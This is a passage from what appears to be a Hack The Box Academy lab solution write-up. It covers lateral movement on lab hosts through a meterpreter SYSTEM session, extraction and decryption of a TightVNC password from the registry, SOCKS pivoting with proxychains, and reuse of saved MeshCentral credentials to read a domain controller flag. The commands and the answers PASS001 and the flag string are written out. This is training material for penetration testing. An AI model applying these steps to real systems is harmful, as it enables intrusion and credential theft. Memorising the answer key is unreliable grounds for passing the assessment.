`Note`: If the update is not being installed, students must repeat the steps to install a new update, while not forgetting to decline the previous one.

Once the target machine has downloaded the update successfully, students will come to know that they have established a `meterpreter` session as `NT AUTHORITY\SYSTEM`:

```shell
sessions -i
```
```
[msf](Jobs:1 Agents:1) exploit(multi/handler) >> sessions -i

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ BACKUP  10.10.14.68:8888 -> 10.129.167.155:63556 (172.30.0.20)
```

Students will interact with the `meterpreter` session, spawn a shell, and query the registry key `HKLM\SOFTWARE\TightVNC\Server` to obtain the value for the VNC password:

```shell
sessions -i 1
shell
reg query HKLM\SOFTWARE\TightVNC\Server /s
```
```
[msf](Jobs:1 Agents:1) exploit(multi/handler) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Windows\system32) > shell
Process 4496 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>reg query HKLM\SOFTWARE\TightVNC\Server /s
reg query HKLM\SOFTWARE\TightVNC\Server /s

HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
    <SNIP>
    UseD3D    REG_DWORD    0x1
    UseMirrorDriver    REG_DWORD    0x1
    EnableUrlParams    REG_DWORD    0x1
    Password    REG_BINARY    F4AD5A560D5431AE
    AlwaysShared    REG_DWORD    0x0
    <SNIP>
```

Subsequently, students will open a new terminal tab and proceed to decrypt the password value to obtain the plaintext representation of it:

```shell
echo -n F4AD5A560D5431AE | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```
```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-crjlj1gunc]─[~]
└──╼ [★]$ echo -n F4AD5A560D5431AE | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

00000000  50 41 53 53 30 30 31 00                           |{hidden}.|
00000008
```

Answer: `PASS001`

# Skill Assessment

## Question 6

### "What's the content of the flag located at DC C:\\Users\\Administrator\\Desktop\\flag.txt?"

Students will return to the `meterpreter` shell session, exit the shell, and will utilize `autorun` to establish dynamic port-forwarding and `ipconfig` to obtain the IP address of the host, will background the current session and start a socks proxy:

```shell
exit
run autoroute -s 172.30.0.0/24
ipconfig
bg
use auxiliary/server/socks_proxy
set version 4a
run
```
```
C:\Windows\system32>exit
exit
(Meterpreter 1)(C:\Windows\system32) > run autoroute -s 172.30.0.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.30.0.0/255.255.255.0...
[+] Added route to 172.30.0.0/255.255.255.0 via 10.129.167.155
[*] Use the -p option to list all active routes

(Meterpreter 1)(C:\Windows\system32) > ipconfig

<SNIP>

Interface  6
============
Name         : vmxnet3 Ethernet Adapter
Hardware MAC : 00:50:56:b0:34:71
MTU          : 1500
IPv4 Address : 172.30.0.20
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::788a:5b87:1722:90ff
IPv6 Netmask : ffff:ffff:ffff:ffff::

(Meterpreter 1)(C:\Windows\system32) > bg
[*] Backgrounding session 1...
[msf](Jobs:1 Agents:1) exploit(multi/handler) >> use auxiliary/server/socks_proxy
View the full module info with the info, or info -d command.

[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> set version 4a
version => 4a
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 1.
```

Students will change the port used in `proxychains.conf` configuration file from `9050` to `1080`:

```shell
sudo sh -c 'sed s/9050/1080/g /etc/proxychains.conf'
```
```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-crjlj1gunc]─[~]
└──╼ [★]$ sudo sh -c 'sed s/9050/1080/g /etc/proxychains.conf'

# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#	
<SNIP>
socks4 	127.0.0.1 1080
```

Subsequently, students will utilize `vncviewer` and `proxychains` to connect to the host with the password `PASS001`:

```shell
proxychains vncviewer 172.30.0.20
```
```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-crjlj1gunc]─[~]
└──╼ [★]$ proxychains vncviewer 172.30.0.20

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16

TigerVNC Viewer 64-bit v1.12.0
Built on: 2023-01-06 16:01
Copyright (C) 1999-2021 TigerVNC Team and many others (see README.rst)
See https://www.tigervnc.org for information on TigerVNC.

Tue Jul 16 03:48:48 2024
 DecodeManager: Detected 4 CPU core(s)
 DecodeManager: Creating 4 decoder thread(s)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.30.0.20:5900  ...  OK

Tue Jul 16 03:48:54 2024
 CConn:       Connected to host 172.30.0.20 port 5900
 CConnection: Server supports RFB protocol version 3.8
 CConnection: Using RFB protocol version 3.8

Tue Jul 16 03:48:55 2024
 CConnection: Choosing security type VncAuth(2)

Tue Jul 16 03:49:08 2024
 CConn:       Using pixel format depth 24 (32bpp) little-endian rgb888
```

Within the established VNC session, students will open `Firefox` and will navigate to `MeshCentral Server` URL, which can be seen in the bookmarks bar.

![[HTB Solutions/CAPE/z. images/7e32f9715f39eee1a7ccb537b7691335_MD5.jpg]]

Students will notice that login information has been saved in the browser, which they can reuse to log in:

![[HTB Solutions/CAPE/z. images/7c18fa75a77280f3bcb91af0713318ed_MD5.jpg]]

Subsequently, students will click on the `DC` agent:

![[HTB Solutions/CAPE/z. images/0fbc87c45924721e61aa8e0d7fdf9f77_MD5.jpg]]

Then navigate to `Terminal`:

![[HTB Solutions/CAPE/z. images/63d2acccc244e15b5dcc56808687c344_MD5.jpg]]

They will establish a connection with the Agent by clicking on `Connect`:

![[HTB Solutions/CAPE/z. images/f051b3968b31176d8a7b5ab0f650c5d4_MD5.jpg]]

Subsequently, students will proceed to grab the flag located in the `C:\Users\Administrator\Desktop\` directory:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```
```
Microsoft Windows [Version 10.0.17763.5936]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\Mesh Agent>type C:\Users\Administrator\Desktop\flag.txt
```

Answer: `M@Ster1ng_the_ART_OF_Lateral_Movement`